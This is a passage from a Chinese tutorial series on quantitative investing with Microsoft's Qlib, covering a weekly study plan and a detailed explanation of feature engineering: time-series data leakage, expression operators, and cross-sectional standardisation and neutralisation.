学习目标与实践建议\n\n学习目标:\n\n✅ 理解Gradient Boosting原理\n✅ 掌握时序数据划分方法\n✅ 学会模型训练与优化\n✅ 能够使用IC/Rank-IC评估模型\n✅ 掌握特征重要性分析方法\n\n预计时间: 6-8小时（5-7天）\n\nWeek 3 - 回测系统 📈\n完整讲解策略回测、投资组合构建、绩效评估。\n文档列表:\n\n01-交易策略理论 - Top-K、IC权重、MV优化\n02-投资组合构建方法 - 三种组合构建方法对比\n03-Executor与成本模型 - 交易成本与执行机制\n04-绩效评估指标 - 收益、风险、绩效指标\n05-实验分析方法 - 参数敏感性、样本外验证\n06-回测流程与实践 - Qlib回测框架\n07-学习检查清单 - 学习目标与实践建议\n\n学习目标:\n\n✅ 理解交易策略理论\n✅ 掌握投资组合构建方法\n✅ 了解交易成本模型\n✅ 能够计算绩效评估指标\n✅ 学会实验分析方法\n✅ 能够完成完整的回测流程\n\n预计时间: 7-9小时（6-8天）\n\nWeek 5 - LSTM深度学习 🧠\n深入学习LSTM神经网络，掌握时序数据的深度学习方法。\n文档系列:\n1. 基础理论系列\n\n基础理论系列\n\n深度学习基础、RNN原理、LSTM原理\nLSTM vs RNN vs GRU对比\n\n\n\n2. PyTorch框架系列\n\nPyTorch框架系列\n\nTensor操作、Autograd、nn.Module\n常用层（LSTM、Linear、Dropout）\n\n\n\n3. LSTM模型构建系列\n\nLSTM模型构建系列\n\n单层、多层、双向LSTM\nLSTM变体与超参数选择\n\n\n\n4. 时序数据处理系列\n\n时序数据处理系列\n\n滑动窗口、数据划分、特征标准化\nPyTorch Dataset与DataLoader\n\n\n\n5. 模型训练优化系列\n\n模型训练优化系列\n\n损失函数、优化器、训练循环\n早停策略、正则化、学习率调度\n\n\n\n6. 实战应用系列\n\n实战应用系列\n\n完整预测流程、超参数调优\n模型保存加载、评估指标\nLSTM vs LightGBM对比、最佳实践\n\n\n\n学习目标:\n\n✅ 理解深度学习和LSTM原理\n✅ 掌握PyTorch框架\n✅ 能够构建LSTM模型\n✅ 学会时序数据处理\n✅ 掌握模型训练与优化\n✅ 能够完成完整的实战应用\n\n预计时间: 8-10小时（5-6天）\n\n🛠️ 技术栈\n\nPython: 主要编程语言\nQlib: 量化投资平台\nPyTorch: 深度学习框架\nLightGBM: 梯度提升树\nPandas/NumPy: 数据处理\nMatplotlib: 数据可视化\n\n\n💡 学习建议\n循序渐进\n按照推荐的学习顺序逐步学习，不要跳过基础概念。\n动手实践\n每个模块都包含代码示例，建议动手运行和修改。\n理解原理\n不仅要会用，还要理解背后的原理。\n多维度思考\n从不同角度理解问题，如风险、收益、成本等。\n持续优化\n量化投资是一个持续优化的过程，不要满足于一次性结果。\n\n📚 扩展阅读\n推荐书籍\n\n《量化投资：策略与技术》\n《Python金融大数据分析》\n《统计套利》\n《深度学习》（Ian Goodfellow）\n《动手学深度学习》\n\n在线课程\n\nCoursera: Deep Learning Specialization\nFast.ai: Practical Deep Learning for Coders\nedX: Machine Learning\n\n\n🤝 交流与反馈\n如有问题或建议，欢迎通过以下方式联系：\n\n📧 Email: [待添加]\n💻 GitHub: [待添加]\n💬 微信: [待添加]\n\n\n\n  开始学习之旅\n  从特征工程开始，系统学习量化投资\n  开始学习 Week 1 →\n\n\n\n  持续更新中，欢迎收藏和分享！\n"},"quant/qlib/week1/01-qlib特征工程全景概览":{"slug":"quant/qlib/week1/01-qlib特征工程全景概览","filePath":"quant/qlib/week1/01-qlib特征工程全景概览.md","title":"01-qlib特征工程全景概览","links":[],"tags":[],"content":"Qlib特征工程全景概览\n1. 引言：量化特征工程的特殊性\n1.1 金融时序数据的三大挑战\n在量化投资领域，特征工程面临着传统机器学习领域所未见的三大核心挑战，这些挑战直接决定了Qlib的设计哲学和技术路线。\n挑战一：非平稳性（Non-stationarity）\n金融时间序列的统计特性随时间漂移，这是量化特征工程最根本的难题。设时间序列 X_t，其分布 P(X_t) 在不同时间窗口 \\Delta t 上不满足平稳性条件：\nP(X_t) \\neq P(X_{t+\\Delta t})\n这意味着：\n\n历史有效的因子在未来可能失效\n训练集和测试集分布存在差异\n模型需要持续更新和适应\n\n举例来说，动量因子在牛市中IC可能达到0.08，但在熊市中可能降至0.02甚至变为负值。这种分布漂移要求特征工程系统具备：\n\n时间窗口敏感性：自动检测因子衰减周期\n动态因子选择：根据市场状态调整因子权重\n回测一致性：确保历史表现具有外推性\n\n挑战二：自相关性（Autocorrelation）\n金融价格序列存在显著的自相关结构，这对特征工程提出了双重约束：\n\\rho_k = \\frac{E[(X_t - \\mu)(X_{t+k} - \\mu)]}{\\sigma^2}\n其中 \\rho_k 是滞后 k 阶的自相关系数。\n自相关性的影响：\n\n特征独立性假设失效：传统ML假设样本独立，但金融数据样本在时间上强相关\n交叉验证方法受限：不能使用随机K-Fold，必须采用时间序列交叉验证\n信息泄露风险增加：不小心引入未来函数会导致模型表现虚高\n\n挑战三：信噪比低（Low Signal-to-Noise Ratio）\n金融数据的信噪比极低，估计在 10^{-3} 到 10^{-2} 量级。这意味着：\n\\frac{Var(\\text{Signal})}{Var(\\text{Noise})} \\approx 10^{-3}\n低信噪比的后果：\n\n特征工程必须极其谨慎，每一步操作都可能放大噪声\n过拟合风险极高，需要严格的样本外验证\n因子组合需要通过大数定律分散风险\n\n1.2 传统ML方法在量化中的失效案例\n让我们通过一个典型失效案例，理解传统ML特征工程在量化中的陷阱。\n案例：PCA在量化中的数据泄漏\n假设你对50个技术指标进行PCA降维，使用sklearn标准流程：\nfrom sklearn.decomposition import PCA\npca = PCA(n_components=5)\nfactors_pca = pca.fit_transform(factor_matrix)  # fit使用全部数据\n这个操作存在两个致命问题：\n问题1：未来信息泄露\nPCA在计算主成分时，使用了整个时间窗口的数据。对于时刻 t 的因子值，PCA的计算实际上包含了 t+1, t+2, \\dots, t+T 的信息：\nX_{\\text{PCA}}(t) = f(X_1, X_2, \\dots, X_t, X_{t+1}, \\dots, X_T)\n这违反了因果性约束，导致回测结果虚高。\n问题2：时序平稳性假设\nPCA假设数据的协方差矩阵在整个时间窗口内稳定：\n\\Sigma = E[X X^T] \\approx \\frac{1}{T}\\sum_{t=1}^T X_t X_t^T\n但在金融时序中，\\Sigma 随时间剧烈变化，导致历史训练的主成分在未来失效。\nQlib的解决方案\nQlib通过以下机制避免了上述问题：\n\n表达式系统强制因果性：所有算子只能使用历史数据\n增量计算：Rolling操作避免跨时间窗口的信息泄露\n分步训练：每个时间窗口独立计算统计量，不使用未来信息\n\n1.3 Qlib的诞生背景与设计哲学\n历史背景\nQlib由微软亚洲研究院于2020年开源，旨在解决量化投资中特征工程的标准化和可复现性问题。在此之前，量化团队各自实现特征计算，导致：\n\n因子定义不统一，难以复现\n回测结果缺乏一致性\n因子研究效率低下\n\n核心设计哲学\nQlib的设计基于三个核心原则：\n原则1：可审计的计算图（Auditable Computation Graph）\n特征工程不是黑盒，而是显式的DAG（有向无环图）：\n\\Phi(X_t) = \\text{Compose}(Op_N \\circ \\cdots \\circ Op_1)(X_t)\n其中每个操作 Op_i 的语义清晰、可追溯、可审计。\n原则2：因果性前置约束（Causality-First Constraint）\n在系统层面强制因果性，而不是依赖开发者自律：\n\\forall t, \\text{Factor}(t) = f(X_{&lt;t})\n所有算子在定义时就必须遵守”只能使用历史数据”的约束。\n原则3：回测一致性优先（Backtest-Consistency Priority）\n宁可牺牲部分灵活性，也要保证回测结果的可信度：\n\n限制某些看似强大但可能导致泄漏的操作\n提供严格的时序验证机制\n输出详细的因子构建日志\n\n\n2. Qlib特征工程的核心定义\n2.1 数学定义：Factor Tensor Transformation\nQlib特征工程的核心是一个从原始数据到因子张量的映射函数 \\Phi：\n\\Phi: \\mathcal{D}_{\\text{raw}} \\to \\mathbb{R}^{[T, N, F]}\n其中：\n\n\\mathcal{D}_{\\text{raw}}：原始数据空间，包含行情、行为等基础字段\nT：时间维度（Time）\nN：资产维度（Number of instruments）\nF：因子维度（Factors）\n\n原始数据的形式化定义\n设原始数据为三维张量 \\mathcal{D}_{\\text{raw}} \\in \\mathbb{R}^{[T, N, V]}，其中 V 是原始字段数（如open, high, low, close, volume）：\n\\mathcal{D}_{\\text{raw}}[t, i, v] = \\text{value}_{i, v}^{(t)}\n表示资产 i 在时刻 t 的字段 v 的值。\n特征工程的目标\nQlib的目标是将 \\mathcal{D}_{\\text{raw}} 转换为可被模型学习的因子张量 \\mathcal{F}：\n\\mathcal{F}[t, i, f] = \\Phi_f(\\mathcal{D}_{\\text{raw}}[:, i, :])[t]\n其中：\n\nf：第 f 个因子\n\\Phi_f：第 f 个因子的计算表达式\n\n2.2 Pipeline形式化表示\nQlib的特征工程Pipeline可以形式化为复合函数：\n\\mathcal{F} = \\mathcal{N} \\circ \\mathcal{C} \\circ \\mathcal{T} \\circ \\mathcal{E}(\\mathcal{D}_{\\text{raw}})\n其中四个层次的操作分别为：\n1. 表达式层（Expression Layer）\\mathcal{E}\n将原始字段通过算子组合成基础因子：\n\\mathcal{E}(\\mathcal{D}_{\\text{raw}}) = \\{ \\text{Ref}(\\mathcal{D}_{\\text{raw}}[:, :, \\text{close}], 1), \\text{Mean}(\\mathcal{D}_{\\text{raw}}[:, :, \\text{close}], 20), \\dots \\}\n2. 时间结构层（Temporal Layer）\\mathcal{T}\n应用滚动、滞后、衰减等时间操作：\n\\mathcal{T}(X) = \\{ \\text{RollingMean}(X, 20), \\text{Lag}(X, 5), \\dots \\}\n3. 横截面层（Cross-Sectional Layer）\\mathcal{C}\n在同一时刻对多个资产进行标准化、排序、中性化：\n\\mathcal{C}(X)[t, i, :] = \\text{Standardize}(X[t, :, :])[i]\n标准化定义为：\nz_{i,t} = \\frac{x_{i,t} - \\mu_t}{\\sigma_t}\n其中 \\mu_t = \\frac{1}{N}\\sum_{i=1}^N x_{i,t} 是横截面均值，\\sigma_t 是标准差。\n4. 标准化层（Normalization Layer）\\mathcal{N}\n最终的标准化处理：\n\\mathcal{N}(X) = \\text{Scale}(X)\nPipeline的图示\n原始数据 [T, N, V]\n    ↓ Expression层\n中间因子 [T, N, K]\n    ↓ Temporal层\n时间特征 [T, N, K]\n    ↓ Cross-section层\n横截面特征 [T, N, K]\n    ↓ Normalization层\n最终因子 [T, N, F]\n\n2.3 与sklearn特征工程的对比表格\nQlib特征工程与传统机器学习（sklearn）特征工程在多个维度上存在根本差异：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n维度sklearn特征工程Qlib特征工程数据结构[N, F] 二维矩阵[T, N, F] 三维张量时序假设样本独立（IID）样本时序相关时间处理手动shift，易出错内置Ref/Lag，语义清晰因果性保证无保证，依赖开发者系统强制约束特征计算静态预处理动态计算图横截面操作需手动实现内置Z-score/Rank/Neutralize可回测性低，易引入未来函数高，时序验证机制可解释性中等强，每步可追溯适用场景图像、文本等静态数据金融时序、推荐系统等序列数据\n关键差异解析\n差异1：数据结构\nsklearn处理的是静态特征矩阵，假设样本独立：\nX \\in \\mathbb{R}^{N \\times F}\n其中 N 是样本数，F 是特征数。\nQlib处理的是动态特征张量，包含时间维度：\n\\mathcal{F} \\in \\mathbb{R}^{T \\times N \\times F}\n这个差异导致了两个系统在设计哲学上的根本不同：\n\nsklearn适合静态分类/回归任务\nQlib适合时序预测任务\n\n差异2：因果性保证\nsklearn中的StandardScaler没有时序概念：\nfrom sklearn.preprocessing import StandardScaler\nscaler = StandardScaler()\nX_scaled = scaler.fit_transform(X)  # 使用全部数据计算μ和σ\n这会导致数据泄漏：在计算 t 时刻的标准化值时，使用了 t 之后的数据。\nQlib中的标准化是时序感知的：\n# Qlib伪代码\nz[t, i] = (x[t, i] - μ[t]) / σ[t]\n# μ[t]只使用t时刻的N个资产计算，不包含t+1, t+2...\n差异3：可回测性\nsklearn特征工程的回测结果往往不可信，因为：\n\n容易引入Look-ahead Bias\n没有时序验证机制\n缺乏详细的因子构建日志\n\nQlib通过以下机制保证回测一致性：\n\n强制因果性：所有算子只能使用历史数据\n增量计算：Rolling操作避免跨时间窗口的信息泄露\n审计日志：记录每个因子的计算过程\n\n\n3. 四层架构深度解析\nQlib特征工程的四层架构是其设计的核心，每一层都有明确的职责和约束。让我们从底层向上逐层解析。\n3.1 Layer 1：原始字段层（Raw Feature Layer）\n定义\n原始字段层是最基础的数据层，直接来自数据源的原始字段。这些字段通常来自：\n\n行情数据：open, high, low, close, volume, amount\n财务数据：market_cap, pe_ratio, pb_ratio, roe, $debt_ratio\n衍生数据：turnover_rate, amplitude, $change_pct\n\n数据特性\n原始字段具有以下特性：\n\n低信噪比：单字段预测能力极弱\n多源异构：不同字段量纲、频率、覆盖率不同\n存在缺失：某些资产在某些时刻可能缺失某些字段\n包含噪声：数据清洗和去噪是预处理重点\n\n代码示例\n# 原始字段示例\n$close          # 收盘价\n$volume         # 成交量\n$market_cap     # 市值\n$turnover_rate  # 换手率\n使用建议\n\n直接使用原始字段作为特征效果很差\n需要通过Layer 2的表达式层进行组合和变换\n缺失值处理需要在原始字段层完成\n\n\n3.2 Layer 2：表达式层（Expression Layer）⭐\n定义\n表达式层是Qlib的灵魂，通过算子组合将原始字段转换为基础因子。表达式可以看作是一个有向无环图（DAG），每个节点是一个算子，边是数据流。\n核心思想\n\\text{Factor} = \\text{Expression}(\\text{Raw Fields})\n表达式 = 算子 + 原始字段 + 参数\n语法示例\n# 基础算子\nRef($close, 1)           # 昨收盘（滞后1期）\nMean($close, 20)         # 20日均线\nStd($close, 20)          # 20日标准差\nMax($high, 5)            # 5日最高价\nMin($low, 5)             # 5日最低价\n \n# 组合算子\n($close - Mean($close, 20)) / Std($close, 20)  # BOLL（布林带）\nMean($close, 5) / Mean($close, 20) - 1        # MA乖离率\n($close - Ref($close, 1)) / Ref($close, 1)     # 日收益率\n实用表达式库\n以下提供10+个常用的Qlib表达式，涵盖技术分析的主要类别：\n技术指标类\n\n\n移动平均线（MA）\nma_5 = Mean($close, 5)\nma_20 = Mean($close, 20)\nma_60 = Mean($close, 60)\n\n\n指数移动平均（EMA）\nema_12 = EMA($close, 12)\nema_26 = EMA($close, 26)\n\n\n相对强弱指数（RSI）\n# RSI = 100 - (100 / (1 + RS))\n# RS = 平均涨幅 / 平均跌幅\nrsi_14 = RSI($close, 14)\n\n\n布林带（BOLL）\nma_20 = Mean($close, 20)\nstd_20 = Std($close, 20)\nboll_upper = ma_20 + 2 * std_20\nboll_lower = ma_20 - 2 * std_20\nboll_width = (boll_upper - boll_lower) / ma_20\n\n\n动量类\n\n\n变动率（ROC）\nroc_5 = ($close / Ref($close, 5)) - 1\nroc_20 = ($close / Ref($close, 20)) - 1\n\n\n动量因子\nmomentum_10 = $close - Ref($close, 10)\nmomentum_20 = $close - Ref($close, 20)\n\n\n波动类\n\n\n平均真实波幅（ATR）\n# ATR = MA(True Range, N)\n# True Range = max(high-low, abs(high-ref(close,1)), abs(low-ref(close,1)))\natr_14 = ATR($high, $low, $close, 14)\n\n\n历史波动率（HV）\n# HV = Std(收益率, N)\nreturns = ($close / Ref($close, 1)) - 1\nhv_20 = Std(returns, 20)\n\n\n成交量类\n\n\n能量潮（OBV）\n# OBV = Σ sign(close变化) * volume\nobv = OBV($close, $volume)\n\n\n量价关系\nvol_price_ratio = $volume / $close\nvol_ma_5 = Mean($volume, 5)\nvol_ratio = $volume / vol_ma_5\n\n\n复合因子\n\n\nMACD\ndif = ema_12 - ema_26\ndea = EMA(dif, 9)\nmacd = (dif - dea) * 2\n\n\nKDJ\n# K值、D值、J值的计算\nrsv = ($close - Min($low, 9)) / (Max($high, 9) - Min($low, 9))\nk = SMA(rsv, 3)\nd = SMA(k, 3)\nj = 3 * k - 2 * d\n\n\n特点与约束\nQlib表达式层有以下特点：\n特点1：可组合性（Composability）\n表达式可以任意组合，形成复杂的计算图：\n\\Phi = \\text{Op}_N \\circ \\cdots \\circ \\text{Op}_2 \\circ \\text{Op}_1\n例如：\nfactor = Std(\n    ($close - Mean($close, 20)) / Std($close, 20),\n    10\n)\n特点2：语义清晰（Semantic Clarity）\n每个算子都有明确的金融语义，不是黑盒：\n\nMean($close, 20)：20日均线（平滑价格）\nRef($close, 1)：滞后1期（避免未来函数）\nStd($close, 20)：20日波动率（风险度量）\n\n特点3：强制因果性（Causality Constraint）\n所有算子只能使用历史数据，这是系统级约束：\n\\forall \\text{Op}, \\text{Op}(X_t) = f(X_{&lt;t})\n例如，Ref($close, 1) 是正确的，因为使用的是 t-1 时刻的数据。\n错误的写法：Ref($close, -1)，因为使用了 t+1 时刻的数据。\n特点4：天然支持Rolling/Lag\n表达式系统天然支持滚动窗口和滞后操作：\nRollingMean($close, 20)  # 20日滚动均值\nLag($close, 5)            # 滞后5期\n这些操作在计算时会自动处理时间对齐，避免数据泄漏。\n\n3.3 Layer 3：时间结构层（Temporal Feature Engineering）\n定义\n时间结构层关注如何在时间维度上提取特征，这是金融时序数据的本质难点。核心问题是：\n\n模型学到的是”时间结构”还是”噪声”？\n\n常见操作\nQlib在时间结构层提供了以下操作：\n1. Lag（滞后）\n将历史数据取到当前时刻：\n\\text{Lag}(X, k)[t] = X[t-k]\n应用场景：\n\n获取历史价格：Lag($close, 1) 获取昨收盘\n构建时滞特征：Lag($volume, 5) 获取5日前的成交量\n避免未来函数：使用滞后数据计算当前指标\n\n2. Rolling（滚动窗口）\n在滚动时间窗口上计算统计量：\n\\text{RollingMean}(X, w)[t] = \\frac{1}{w} \\sum_{i=0}^{w-1} X[t-i]\n常见Rolling算子：\n\nRollingMean(X, w)：滚动均值\nRollingStd(X, w)：滚动标准差\nRollingMax(X, w)：滚动最大值\nRollingMin(X, w)：滚动最小值\nRollingCorr(X, Y, w)：滚动相关系数\nRollingRegression(X, Y, w)：滚动回归\n\n应用场景：\n\n技术指标计算：RollingMean($close, 20) 是20日均线\n波动率度量：RollingStd($return, 20) 是20日波动率\n动量识别：RollingCorr($close, $market, 20) 衡量与市场相关性\n\n3. Decay（衰减）\n对历史数据应用指数衰减，赋予近期数据更高权重：\n\\text{Decay}(X, \\alpha)[t] = \\frac{\\sum_{i=0}^{\\infty} \\alpha^i X[t-i]}{\\sum_{i=0}^{\\infty} \\alpha^i} = \\frac{\\sum_{i=0}^{\\infty} \\alpha^i X[t-i]}{1/(1-\\alpha)}\n其中 \\alpha \\in (0, 1) 是衰减因子。\n应用场景：\n\nEMA（指数移动平均）：EMA($close, 20) 本质是衰减均值\n动量衰减：Decay($volume, 0.95) 赋予近期成交量更高权重\n信号平滑：衰减操作比简单Moving Average更平滑\n\n4. Horizon对齐（Label Shift）\n将未来的Label对齐到当前时刻，这是量化特征工程的核心操作：\n\\text{Label}[t] = Y_{t \\to t+h} = \\frac{P_{t+h}}{P_t} - 1\n详细原理将在文档2中展开。\n时间因果关系\nQlib强制你把”时间因果关系”写进特征定义，而不是交给模型猜。\n错误示例（交给模型猜）：\n# 直接把原始价格扔给模型，让模型自己学时间关系\nfeature = $close\nmodel.fit(feature, label)\n正确示例（显式时间结构）：\n# 显式定义时间结构：20日均线、5日动量\nfeature1 = Mean($close, 20)       # 20日均线\nfeature2 = ($close / Ref($close, 5)) - 1  # 5日动量\nmodel.fit([feature1, feature2], label)\n在链上高频/套利中的重要性\n在链上高频交易和套利中，时间结构工程尤为重要：\n场景1：MEV套利\n链上交易存在时序依赖关系：\n\n用户提交交易 → 矿工看到交易 → 矿工插入MEV交易\n\n特征工程需要显式建模这个时序：\n# 链上时间结构特征\nmempool_latency = block_timestamp - tx_timestamp  # 内存池等待时间\ngas_price_momentum = (gas_price - Ref(gas_price, 1)) / Ref(gas_price, 1)\n场景2：套利机会识别\nDEX间套利需要识别价格时序模式：\n# DEX A和B的价格时序关系\nprice_diff_momentum = (diff_A_t - diff_A_{t-1}) / diff_A_{t-1}\n这些时间结构特征必须显式定义，而不是让模型从原始价格序列中自动学习。\n\n3.4 Layer 4：横截面层（Cross-sectional Engineering）\n定义\n横截面层关注同一时刻不同资产之间的关系。这是很多非量化出身的人最容易忽略的层次，但却是量化投资的核心差异所在。\n核心思想\n\n你不是在预测价格，而是在预测”同一时刻资产之间的相对强弱”。\n\n常见操作\nQlib在横截面层提供了以下操作：\n1. Z-score标准化（去量纲化）\n将同一时刻的所有资产值标准化到标准正态分布：\nz_{i,t} = \\frac{x_{i,t} - \\mu_t}{\\sigma_t}\n其中：\n\n\\mu_t = \\frac{1}{N}\\sum_{j=1}^N x_{j,t} 是 t 时刻的横截面均值\n\\sigma_t = \\sqrt{\\frac{1}{N}\\sum_{j=1}^N (x_{j,t} - \\mu_t)^2} 是标准差\n\n应用场景\n将不同单位的因子拉到同一量纲：\n\nPE（倍数）和ROE（百分比）无法直接相加\n标准化后，两者都变成”偏离均值的标准差倍数”\n可以线性组合：factor = 0.6 * z_pe + 0.4 * z_roe\n\n示例\n假设 t 时刻有3只股票的PE值：\n\n股票A：PE = 30\n股票B：PE = 20\n股票C：PE = 10\n\n计算：\n\n\\mu = (30 + 20 + 10) / 3 = 20\n\\sigma = \\sqrt{((30-20)^2 + (20-20)^2 + (10-20)^2) / 3} = 8.16\nz_A = (30-20)/8.16 = 1.22\nz_B = (20-20)/8.16 = 0\nz_C = (10-20)/8.16 = -1.22\n\n2. Rank（排序标准化）\n将因子值换成排序位置，再缩放到 [0, 1]：\n\\text{Rank}(x_i) = \\frac{\\text{rank}(x_i) - 1}{N - 1}\n其中 \\text{rank}(x_i) 是 x_i 在 \\{x_1, x_2, \\dots, x_N\\} 中的排序位置（从1开始）。\n应用场景\n彻底杀掉异常值：\n\n某股票的PE可能是10000倍（数据噪声）\n在Rank眼里，它仅仅是第一名\n只在乎”谁比谁强”，不在乎强多少\n\n示例\n假设3只股票的PE值：[30, 20, 10000]\nZ-score标准化：\n\n\\mu = 3350\n\\sigma = 5756\nz = [-0.58, -0.58, 1.16]\n10000的股票对z-score影响很大\n\nRank标准化：\n\n排序：[2, 1, 3]\n标准化：[0.5, 0, 1]\n10000的股票只是第一名，对其他股票无影响\n\n3. Neutralization（中性化/去相关）\n做回归，取残差，剔除行业、市值等”作弊因素”：\nx_i = \\beta_0 + \\sum_{j=1}^K \\beta_j \\cdot \\text{feature}_{i,j} + \\varepsilon_i\n残差 \\varepsilon_i 是中性化后的因子，表示”剔除风格因子后的纯Alpha”。\n应用场景\n行业中性化：\n\n如果一个股票涨是因为整个白酒板块都在涨，这不叫你的因子厉害\n中性化后，剩下的才是这只股票超出所属行业的”纯粹特质”\n\n市值中性化：\n\n小盘股弹性大，天然涨得多\n中性化后，剔除市值效应\n比较的是”同等市值下的相对强弱”\n\n示例\n假设有3只股票：\n\n股票A：行业=白酒，市值=100亿，因子值=10\n股票B：行业=白酒，市值=100亿，因子值=8\n股票C：行业=科技，市值=50亿，因子值=9\n\n如果不中性化：\n\n股票A表现最好（因子值=10）\n\n行业中性化后（剔除行业效应）：\n\n在白酒行业内部，A比B强（10 &gt; 8）\n残差：A=+1, B=-1, C=0\n\n市值中性化后（再剔除市值效应）：\n\nC是小盘股（50亿），有市值溢价\n中性化后，C的因子值会下降\n\n横截面处理的意义\n通过横截面标准化和中性化，你的思维模型发生了进化：\n\n承认无知：承认自己无法准确预测宏观经济和大盘波动（Beta）\n寻找秩序：相信即便在乱世或盛世，资产之间总有”好坏之分”\n纯化信号：把那些”搭便车”的收益（行业、市值、大盘涨跌）全部扔掉，只捕捉那一点点代表公司真正竞争力的纯Alpha\n\n在DeFi世界中的类比\n在DeFi世界中，横截面处理同样重要：\n同一区块里：哪个池子更”异常”\n\n比较同一区块内所有DEX池子的交易量、价格变化\n找出显著偏离平均水平的池子\n\n同一时间窗内：哪个Token行为偏离更多\n\n比较同一小时内所有Token的价格波动、成交量变化\n找出表现异常的Token\n\n横截面不是数学技巧，而是一种投资策略：\n\n我们不赌国运涨跌，我们只赌”优胜劣汰”。\n\n\n4. 解决的三个核心问题\nQlib特征工程的设计旨在解决量化投资中的三个核心问题。让我们逐一深入分析。\n4.1 问题一：如何定义因子（表达式层）\n问题描述\n在量化投资中，“因子”是一个高度抽象的概念。传统做法是：\n\n用Python/Pandas手动计算因子\n因子定义散落在不同脚本中\n难以复现和验证\n\n这种做法存在三个问题：\n\n可读性差：复杂的因子计算逻辑难以理解\n可维护性差：修改因子需要改动多处代码\n可复现性差：不同人对因子的理解可能不一致\n\nQlib的解决方案\nQlib引入表达式系统，将因子定义标准化：\n核心思想\n\\text{Factor} = \\text{Expression} = \\text{Composition of Operators}\n因子 = 表达式 = 算子的组合\n表达式系统的优势\n优势1：声明式定义\n# 声明式：清晰表达意图\nfactor = ($close - Mean($close, 20)) / Std($close, 20)\n \n# vs 命令式：实现细节混乱\ndef compute_factor(close):\n    ma20 = close.rolling(20).mean()\n    std20 = close.rolling(20).std()\n    return (close - ma20) / std20\n优势2：可组合性\n表达式可以任意组合，形成复杂的因子：\n# 基础因子\nma20 = Mean($close, 20)\nvol20 = Std($close, 20)\nboll = ($close - ma20) / vol20\n \n# 组合因子\nmomentum_boll = boll * (($close / Ref($close, 5)) - 1)\n优势3：自动优化\n表达式系统可以自动优化计算：\n\n公共子表达式消除\n增量计算（避免重复计算Rolling）\n并行化执行\n\n算子语义约束\nQlib的算子有严格的语义约束，确保：\n约束1：因果性（Causality）\n所有算子只能使用历史数据：\n\\forall \\text{Op}, \\text{Op}(X_t) = f(X_{&lt;t})\n例如：\n\nRef($close, 1) ✓ 使用 t-1 时刻数据\nRef($close, -1) ✗ 使用 t+1 时刻数据（未来函数）\n\n约束2：时间一致性（Temporal Consistency）\n算子的输出时间戳与输入一致：\n\\text{Timestamp}(\\text{Op}(X_t)) = \\text{Timestamp}(X_t)\n例如：\n\nMean($close, 20) 输出的是 t 时刻的均值（使用 t-19 到 t 的数据）\n输出时间戳仍然是 t，不是 t-10 或 t+1\n\n约束3：可审计性（Auditability）\n每个算子的计算过程可以追溯：\n\n输入数据：明确指定\n计算过程：语义清晰\n输出结果：可验证\n\n\n4.2 问题二：如何对齐时间 &amp; 横截面（金融时序的本质难点）\n问题描述\n金融时序数据的对齐是特征工程中最本质、最困难的问题，包含两个维度：\n维度1：时间对齐（Temporal Alignment）\n如何将”当前的因子”与”未来的收益”对齐？\n场景示例\n你有：\n\nt 时刻的因子：Factor[t] = 1.5\nt 到 t+5 时刻的收益：Return[t→t+5] = 5%\n\n问题是：如何把它们放在同一行数据中训练模型？\n错误对齐：\nRow_t: {Factor[t], Return[t]}  # Return[t]是t时刻收益，已实现\n这会导致Look-ahead Bias，因为Return[t]在t时刻还未发生。\n正确对齐：\nRow_t: {Factor[t], Return[t→t+5]}  # Return[t→t+5]是未来收益\n维度2：横截面对齐（Cross-Sectional Alignment）\n如何将不同时间频率、不同覆盖范围的数据对齐到同一时刻？\n场景示例\n\n行情数据：每日（频率=1天，覆盖=全市场5000只股票）\n财务数据：季度（频率=1季度，覆盖=部分股票）\n行业数据：月度（频率=1月，覆盖=全市场）\n\n如何把它们对齐到 t 时刻？\nQlib的解决方案\n时间对齐：Horizon Shift\nQlib使用Label Shift操作将未来的Label对齐到当前时刻：\n\\text{Label}_t = Y_{t \\to t+h} = \\frac{P_{t+h}}{P_t} - 1\n详细原理见文档2。\n横截面对齐：统一时间网格\nQlib将所有数据对齐到统一的时间网格：\ntime_grid = [t_1, t_2, ..., t_T]\n \n# 行情数据：已有，直接映射\nprice[t] = get_price(t)\n \n# 财务数据：前向填充\nfinancial[t] = latest_financial_data_before(t)\n \n# 行业数据：对齐到最近月份\nindustry[t] = industry_data(round_down_to_month(t))\n横截面对齐的挑战\n挑战1：频率不一致\n不同数据源的频率不同：\n\n行情数据：日频\n财务数据：季频\n宏观数据：月频\n\n解决方案：降采样/升采样\n\n高频 → 低频：取最后值、均值、聚合\n低频 → 高频：前向填充\n\n挑战2：覆盖范围不一致\n不同数据源的覆盖范围不同：\n\n行情数据：覆盖全市场\n财务数据：覆盖部分股票（停牌、退市等）\n行业数据：覆盖全市场\n\n解决方案：缺失值处理\n\n删除缺失值过多的时刻\n用行业均值填充\n用历史均值填充\n\n挑战3：时间偏差\n某些数据存在发布延迟：\n\n财报数据：公布日期晚于财务期间\n宏观数据：公布日期晚于统计期间\n\n解决方案：\n\n使用公布日期作为有效日期\n对于预测，只能使用公布前的数据\n\n\n4.3 问题三：如何避免数据泄漏 + 保证可回测性\n问题描述\n数据泄漏是量化回测中最致命的问题，会导致：\n\n回测收益虚高\n实盘表现惨淡\n策略完全失效\n\n常见的数据泄漏场景\n场景1：未来信息泄露\n在计算 t 时刻的因子时，不小心用到了 t+1, t+2, \\dots 时刻的数据。\n错误示例：\n# 计算t时刻的波动率，使用了未来数据\nvolatility[t] = std(price[t-10:t+10])  # 包含t+1到t+10的数据\n正确示例：\n# 只使用历史数据\nvolatility[t] = std(price[t-20:t])  # 只使用t-20到t的数据\n场景2：样本外信息混入\n在训练模型时，使用了测试集的信息。\n错误示例：\n# 在整个数据集上标准化\nscaler = StandardScaler()\nX_scaled = scaler.fit_transform(X)  # 使用了全部数据\n正确示例：\n# 只在训练集上标准化，然后应用到测试集\nscaler = StandardScaler()\nX_train_scaled = scaler.fit_transform(X_train)\nX_test_scaled = scaler.transform(X_test)\n场景3：Look-ahead Bias\n在回测时，使用了未来才能知道的信息。\n错误示例：\n# 回测时，知道t时刻的收盘价，然后决定是否买入\nif price[t] &gt; ma[t]:\n    buy()  # 但实际上，t时刻你不知道price[t]\n正确示例：\n# 回测时，只能使用t-1时刻的信息\nif price[t-1] &gt; ma[t-1]:\n    buy()  # t-1时刻的收盘价，t时刻开盘前决定\nQlib的防护体系\nQlib通过多层防护机制避免数据泄漏：\n防护1：算子级约束\n所有算子强制只能使用历史数据：\n\\forall \\text{Op}, 